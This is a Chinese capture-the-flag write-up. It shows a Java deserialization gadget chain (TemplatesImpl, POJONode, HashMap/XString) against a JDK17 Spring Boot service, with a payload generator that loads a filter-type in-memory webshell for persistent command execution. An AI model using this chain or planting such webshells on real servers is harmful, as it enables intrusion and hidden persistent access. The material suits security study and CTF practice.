# more black coffee

## 题目简述

本题是 `black coffee` 的延伸题，服务端仍是 JDK17 / Spring Boot 环境下的 Java 原生反序列化入口，过滤条件和可用 gadget 选择与前题基本一致。`TemplatesImpl` 负责加载字节码，`POJONode` 负责触发 getter，`HashMap + XString` 负责从反序列化流程触发 `toString()`。

区别在于题目目标从一次性命令执行变成持久化 Web 交互。payload 中不再让 `TemplatesImpl` 执行简单命令，而是加载编译后的 `FilterShell.class`，在 Web 容器内注册过滤器内存马，后续通过内存马接口读取 flag 或执行命令。

## 解题过程

题目打法和上面完全一样，只是得把命令执行换成内存马。
内存马代码：[https://github.com/un1novvn/Java-unser-utils-17/blob/master/src/main/java/FilterShell.java](https://github.com/un1novvn/Java-unser-utils-17/blob/master/src/main/java/FilterShell.java)

```
package cn.org.unk;
import com.fasterxml.jackson.databind.node.POJONode;
import javax.swing.event.EventListenerList;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
public class Main {
    public static void main(String[] args) throws Exception{
        Object calc =
            Gadget17.getTemplatesImpl(Util17.file2ByteArray("target/classes/FilterShell.class"));
        POJONode pojoNode = Gadget17.getPOJONode(calc);
        HashMap hashMapXString = Gadget17.get_HashMap_XString(pojoNode);
        byte[] serialize = Util17.serialize(hashMapXString);
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize)));
    }
}
```

## 方法总结

同一条 Java 反序列化链可以服务于不同目标：命令执行、回显、写文件或内存马。续题中链路本身不变，关键是替换 `TemplatesImpl` 中加载的字节码内容。遇到无稳定回显或需要持久交互的 Web Java 题，可以优先考虑把一次性命令执行升级为 Filter 型内存马。
